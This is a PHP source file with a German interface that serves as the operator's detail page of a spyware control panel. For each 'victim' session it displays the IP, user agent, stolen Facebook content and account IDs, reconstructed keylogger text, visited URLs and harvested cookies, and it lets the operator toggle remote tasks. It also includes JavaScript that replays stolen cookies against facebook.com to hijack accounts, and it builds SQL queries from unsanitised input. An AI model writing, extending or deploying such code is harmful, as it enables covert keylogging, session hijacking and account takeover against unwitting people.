<?php
	$session = $_GET["detail"];

	$victim = mysqli_query($con, "SELECT * FROM user WHERE session = '".$session."' ORDER BY time DESC");

	if(mysqli_num_rows($victim) != 0){

		$last = mysqli_fetch_object($victim);
		$tasks = $last->do_;
		if(isset($_GET["toggle"])){
			$target = $_GET["toggle"];
			if($tasks != "wait")
				$tasks = unserialize($tasks);
			if(is_array($tasks)){
				if(in_array($target, $tasks)){
					foreach($tasks as $key => $value){
						if($value == $target){
							$count = $key;
							break;
						}
					}
					unset($tasks[$count]);
					if(sizeof($tasks) != 0)
						$do = serialize(array_values($tasks));
					else
						$do = "wait";
					$action = "deaktiviert";
					$class = "redbg ";
				}
				else{
					$tasks[] = $target;
					$do = serialize(array_values($tasks));
					$action = "aktiviert";
				}
			}
			else{
				$tasks = array($target);
				$do = serialize($tasks);
				$action = "aktiviert";
			}
			$tasks = $do;
			mysqli_query($con, "UPDATE user SET do_ = '".$do."' WHERE session = '".$session."'") or die(mysqli_error($con));
			echo "<div class=\"".$class."note\">Die Aufgabe \"".$target."\" wurde ".$action.".</div><br />";
		}

		//$location = mysql_query("SELECT * from location WHERE session = '".$session."'");
		//$location = mysqli_query($con, "SELECT * from location WHERE session = '".$session."'");
		//$posts = mysql_query("SELECT * from posts WHERE session = '".$session."'");
		//$posts = mysqli_query($con, "SELECT * from posts WHERE session = '".$session."'");
		
		$delarr = array(
			0 => "jetzt (ALLE !)",
			60*30 => "30 Minuten",
			60*60 => "1 Stunde",
			60*60*2 => "2 Stunden",
			60*60*6 => "6 Stunden",
			60*60*12 => "12 Stunden",
			60*60*24 => "1 Tag",
			60*60*24*2 => "2 Tage",
			60*60*24*7 => "1 Woche",
			60*60*24*30 => "1 Monat",
		);
		function anzahl_begrenzen($session,$entries){
				if(isset($_GET['show_anzahl']))
					$GLOBALS['showurl'] = (INT)$_GET['show_anzahl'];
				$show = ($GLOBALS['showurl'] < $entries) ? $GLOBALS['showurl'] : $entries;
				echo "<form id=\"show_anzahl2\" action=\"./index.php\" method=\"GET\"><input type=\"hidden\" name=\"detail\" value=\"".$session."\" />".$show." von ".$entries." Eintr&auml;gen werden angezeigt. <input type=\"int\" size=\"4\" name=\"show_anzahl\" value=\"".$show."\" /><input type=\"submit\" value=\"Anzeigen\" /></form>";
		}
		
		//Basisinfo
		echo "<h1>Basisinfo</h1><br />";
		echo "<table>";
		echo "<tr><td>IP:</td><td>".$last->ip."</td></tr>";
		echo "<tr><td>User Agent:</td><td><a target=\"_blank\" href=\"http://user-agent-string.info/?Fuas=".urlencode($last->agent)."&test=6319&action=analyze\">".$last->agent."</a></td></tr>";
		echo "<tr><td>SessionID:</td><td>".$session."</td></tr>";
		echo "<tr><td>Zuletzt gesehen:</td><td>".difference($last->time)." h:m:s --- ".date("d.m.y - H:i:s", $last->time)."</td></tr>";
		echo "<tr><td>Eintr&auml;ge:</td><td>".mysqli_num_rows($victim)."</td></tr>";
		echo "</table>";
		
		//Kommentar
		echo "<br /><br />";
		echo "<h1>Kommentar:</h1><br />";
		$comments = mysqli_query($con, "SELECT * FROM comments WHERE session = '".$session."' ORDER BY time DESC LIMIT 1") or die(mysqli_error($con));
		$comment = (mysqli_num_rows($comments) == 1) ? mysqli_fetch_object($comments)->comment : "";
		echo "<span id=\"commentbackup\" class=\"hidden\">".$comment."</span>";
		echo "<form name=\"comment\" action=\"./index.php?detail=".$session."\" method=\"post\">";
		echo "<textarea id=\"kommiarea\" name=\"text\" rows=\"2\" cols=\"50\">".$comment."</textarea><br />";
		echo "<input type=\"button\" value=\"Speichern\" onclick=\"javascript:checkthis()\">";
		echo "</form>";
		
		//Aktionen
		echo "<br /><br />";
		echo "<h1>Aktionen:</h1><br />";		
		echo "<table><tr>";
		echo "<td class=\"settings\" onclick=\"javascript:if(confirm(unescape('Session \'".$session."\' aufr%E4umen?')) == true){window.location='./index.php?detail=".$session."&clean=".$session."'}\">Session aufr&auml;umen</td>";
		echo "<td class=\"redbg button\" onclick=\"javascript:if(confirm('Session ".$session." entfernen?') == true){window.location='./index.php?detail=".$session."&delete=".$session."'}\">Session l&ouml;schen</td>\n";
		echo "</tr></table>";
		
		//Aufgaben
		echo "<br /><br />";
		echo "<h1>Aufgaben:</h1><br />";
		
		if($tasks != "wait")
			$t = unserialize($tasks);
		
		echo "<table><tr>";
		$c = 1;
		foreach($list as $value){
			if(is_array($t) && in_array($value, $t))
				$status = "active button";
			else
				$status = "inactive button";
			echo "<td class=\"".$status." even\" onclick=\"javascript:window.location='./index.php?detail=".$session."&toggle=".$value."'\">".type2text($value)."</td>\n";
			if($c == 10){
				$c = 0;
				echo "</tr>\n<tr>";
			}
			$c++;
		}
		echo "\n</tr>";
		echo "</table>";
		
		//Daten
		$data = mysqli_query($con, "SELECT * FROM data WHERE session = '".$session."' ORDER BY time ASC");
		if(mysqli_num_rows($data) >= 1){
			echo "<br /><br />";
			echo "<h1>Daten:</h1><br />";
			echo "<input type=\"button\" value=\"Alle l&ouml;schen\" onclick=\"javascript:if(confirm(unescape('Alle Eintr%E4ge entfernen?')) == true){window.location='./index.php?detail=".$session."&deletedata=all'}\">\n";
			echo "<input type=\"button\" value=\"Alle alten l&ouml;schen\" onclick=\"javascript:if(confirm(unescape('Alle alten Eintr%E4ge entfernen?')) == true){window.location='./index.php?detail=".$session."&deletedata=old'}\"><br />\n";
			echo "<table class=\"bigtable\"><tr><td width=\"120px\"><b>Zeit</b></td><td width=\"120px\"><b>Typ</b></td><td><b>Wert</b></td><td><b>L&ouml;schen</b></td></tr>\n";
			
			while($row = mysqli_fetch_object($data)){
				$key = $row->key_;
				$value = $row->value_;
				if($key == 'fbcontent')
					$show = htmlspecialchars(urldecode(gzdecode(base64_decode($value))));
				else if($key == 'fbacc')
					$show = "<a target=\"_blank\" href=\"https://facebook.com/".$value."\">".$value."</a>";
				else
					$show = htmlspecialchars($value);
				echo "<tr><td width=\"120px\">".date("d.m.y - H:i:s", $row->time)."</td><td class=\"even\">".type2text($key)."<span class=\"hidden\">".$row->id."</span></td><td><div class=\"longtext\">".$show."</div></td><td class=\"redbg button\" onclick=\"javascript:if(confirm('Eintrag entfernen?') == true){window.location='./index.php?detail=".$session."&deletedata=".$row->id."'}\"></td></tr>\n";
			}
			echo "</table>";
		}
		
		//Keylogger
		
		$keylogger = mysqli_query($con, "SELECT * FROM keylogger WHERE session = '".$session."' ORDER BY time ASC");

		if(mysqli_num_rows($keylogger) >= 1){
			echo "<br /><br />";
			echo "<h1>Keylogger:</h1><br />";
			echo "Eintr&auml;ge l&ouml;schen &auml;lter als:";
			echo "<table><tr>\n";
			foreach($delarr as $k => $v){
				echo "<td class=\"settings\" onclick=\"javascript:if(confirm(unescape('Keylog f%FCr Eintr%E4ge %E4lter als ".$v." entfernen?')) == true){window.location='./index.php?detail=".$session."&keydel=".$session."&time=".$k."'}\">".$v."</td>\n";
			}
			echo "</tr></table>\n";
			echo "<br />";
			echo "<table><tr><td width=\"120px\"><b>Zeit</b></td><td><b>Text</b></td></tr>\n";
			$log = "";
			$j = 0;
			$first = array();

			while($row = mysqli_fetch_object($keylogger)){
				$log .= $row->content;
				$array = explode(".", $row->content);
				$index = sizeof($array)-4;
				$first[$j] = array();
				$ts = explode("-", $array[$index]);
				$first[$j]['timestamp'] = $ts[1];
				$first[$j]['time'] = $row->time;
				$j++;
			}
			$logarr = explode("-", $log);
			$t = explode(".", $logarr[0]);
			$time = $t[0];
			$i = 0;
			//print_r($first);
			//print_r($logarr);
			$k = 0;
			foreach($logarr as $value){
				$char = explode(".", $value);
				if($char[0] > $first[$k]['timestamp']){
					$k++;
				}
				$closest_time = $first[$k]['time'];
				if($i == 0)
					echo "<tr><td>".date("d.m.y - H:i:s", $closest_time)."</td><td>\n";
				echo $char[1];
				$temptime = (int)$char[0];
				if($temptime-$time > 20000)
					echo " ";
				if($temptime-$time > 120000){
					echo "</td></tr>\n<tr><td>".date("d.m.y - H:i:s", $closest_time)."</td><td>\n";
				}
				echo code2char($char[3], $char[2]);
				$time = $temptime;
				$i++;
			}
			echo "</td></tr></table>";
		}
		
		//URLs
	
		$urls = mysqli_query($con, "SELECT * FROM location WHERE session = '".$session."' ORDER BY time DESC");
		$entries = mysqli_num_rows($urls);
		if($entries >= 1){
			echo "<br /><br />";
			echo "<h1>URLs:</h1><br />";
			
			echo "Eintr&auml;ge l&ouml;schen &auml;lter als:<br />\n";
			echo "<table><tr>\n";
			foreach($delarr as $k => $v){
				echo "<td class=\"settings\" onclick=\"javascript:if(confirm(unescape('URLs f%FCr Eintr%E4ge %E4lter als ".$v." entfernen?')) == true){window.location='./index.php?detail=".$session."&urldel=".$session."&time=".$k."'}\">".$v."</td>\n";
			}
			echo "</tr></table>";
			anzahl_begrenzen($session,$entries);
			echo "<table><tr><td width=\"120px\"><b>Zeit</b></td><td><b>URL</b></td><td><b>Domain-Watching</b></td></tr>\n";
			$c = 1;
			
			while($row = mysqli_fetch_object($urls)){
				if($c <= $showurl){
					$domarray = array();
					$doms = mysqli_query($con, "SELECT * FROM domain_watch WHERE session = '".$session."'");
					while($dom = mysqli_fetch_object($doms)){
						$domarray[] = $dom->domain;
					}
					$domain = parse_url($row->url, PHP_URL_HOST);
					$class = (in_array($domain, $domarray)) ? "active button" : "inactive button";
					echo "<tr><td>".date("d.m.y - H:i:s", $row->time)."</td><td><a target=\"_blank\" href=\"".$row->url."\">".shorten($row->url)."</a></td><td class=\"".$class."\" onclick=\"javascript:window.location='./index.php?detail=".$session."&domtoggle=".urlencode($domain)."'\">".$domain."</td></tr>\n";
				}
				else
					break;
				$c++;
			}
			echo "</table>";
		}
		//COOKIEs
	
		$cookies = mysqli_query($con, "SELECT * FROM cookies WHERE session ='".$session."' ORDER BY time DESC");
	
		$entries = @mysqli_num_rows($cookies);
		if($entries >= 1){
			
			echo "<br /><br />";
			echo "<h1>Cookies:</h1><br />";
			echo "Eintr&auml;ge l&ouml;schen &auml;lter als:<br />\n";
			echo "<table><tr>\n";
			foreach($delarr as $k => $v){
				echo "<td class=\"settings\" onclick=\"javascript:if(confirm(unescape('COOKIEs f%FCr Eintr%E4ge %E4lter als ".$v." entfernen?')) == true){window.location='./index.php?detail=".$session."&cookiedel=".$session."&time=".$k."'}\">".$v."</td>\n";
			}
			echo "</tr></table>";
			anzahl_begrenzen($session,$entries);
			
			/*function NehmeCookieAN(cookie) {
			
				var cookie = decodeURIComponent(cookie);
				var teil = cookie.split("\n");
				
				var domain = "facebook.com";
				var date = new Date();
				date.setTime(date.getTime()+(7*24*60*60*1000));
				var expires = date.toUTCString();
					
		        for (var i = 0; i < (teil.length)-1; i++) {
					
					var name_value = teil[i].split("+:+");
					var name = name_value[0];
					var value = name_value[1];
					
					
					document.cookie=name + "=" + value + "; expires=" + expires + "";
					
				}
				alert(i + " Cookies gesetzt");

			}
			*/ // Doesnt work because cross domain
			echo '<script language="JavaScript">
			//Alternative with Greasemonkey: Iframe
			function NehmeCookieAN(cookie) {
			
				var cookie = decodeURIComponent(cookie);
				var teil = cookie.split("\n");
				
				var url = prompt("Bei welcher URL willst du die Cookies setzen?", "https://www.facebook.com");
				if(url){
				url += "?cookiescript=enabled";

				
		        for (var i = 0; i < (teil.length)-1; i++) {
					
					var name_value = teil[i].split("+:+");
					var name = name_value[0];
					var value = name_value[1];
					
					
					url += "&" + name + "=" + value + "";
					
				}
				fenster = window.open(url, "Cookie Popupfenster", "width=400,height=300,resizable=yes");
				fenster.focus();

				alert(i + " Cookies gesetzt");
				}

			}
			</script>';
			echo "<table><tr><td width=\"120px\"><b>Zeit</b></td><td><b>Cookies-Watching</b></td></tr>\n";
			$c = 1;
			
			while($row = mysqli_fetch_object($cookies)){
				$cookie = str_replace("\n", "<br />", $row->cookies);
				
				echo "<tr><td>".date("d.m.y - H:i:s", $row->time)."</td><td onclick=\"javascript:if(confirm(unescape('COOKIEs setzen?')) == true){NehmeCookieAN('".urlencode($row->cookies)."')}\">".$cookie."</td></tr>\n";
		
				$c++;
				
				if($c > $showurl)
					break;
			}
			echo "</table>";

		}
	}
	else{
		echo "F&uuml;r die ausgew&auml;hlte Session gibt es keine Eintr&auml;ge!";
	}
	mysqli_free_result($victim);
	
	?>